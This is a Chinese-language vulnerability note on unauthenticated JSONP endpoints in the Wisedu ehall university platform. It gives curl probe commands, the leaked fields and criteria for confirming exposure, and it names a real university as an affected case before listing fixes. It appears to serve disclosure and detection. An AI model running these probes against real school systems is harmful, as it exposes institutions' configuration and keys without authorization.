# ehall 金智教育 JSONP API 未授权访问模式 (2026-06-09)

## 漏洞描述
金智教育(wisedu) ehall 平台的 JSONP 接口通常无需认证即可访问，泄露应用配置、
内部路径、供应商信息等敏感数据。

## 检测方法
```bash
# 1. 获取应用列表
curl -sk 'http://ehall.TARGET.edu.cn/jsonp/serviceCenterData.json'

# 2. 获取应用信息（需要 appId）
curl -sk 'http://ehall.TARGET.edu.cn/jsonp/appInfo.json?appId=APP_ID'

# 3. 获取应用详情（含内部路径）
curl -sk 'http://ehall.TARGET.edu.cn/jsonp/appIntroduction.json?appId=APP_ID'

# 4. 获取用户信息（游客模式）
curl -sk 'http://ehall.TARGET.edu.cn/jsonp/userInfo.json'

# 5. 获取学校配置
curl -sk 'http://ehall.TARGET.edu.cn/jsonp/school.json'

# 6. 获取服务角色
curl -sk 'http://ehall.TARGET.edu.cn/jsonp/serviceRoleApp.json?serviceRoleId=1__0'
```

## 泄露内容
- appKey: 应用密钥（如 4834312099124186-4.0.11_TR1）
- domainId: 域 ID
- deployPrefix: 部署路径（如 http://ehall.TARGET.edu.cn/xsfw）
- vendorName: 供应商名称（通常为"金智教育"）
- version: 版本号
- authUrl: 认证 URL
- pcOpenUrl: PC 端打开 URL
- onlineTime: 上线时间

## 判断标准
- 返回 200 + JSON 数据 = 漏洞存在
- 返回 302 重定向 = 需要认证
- 返回 hasLogin:false = 游客模式可访问

## 实战案例
- gxnu.edu.cn: appInfo.json 泄露 appKey、domainId、deployPrefix、vendorName
- 多个高校的 ehall 平台存在相同问题

## 修复建议
1. 对 JSONP 接口实施认证
2. 限制返回的敏感字段
3. 移除 appKey、domainId、authUrl 等敏感信息
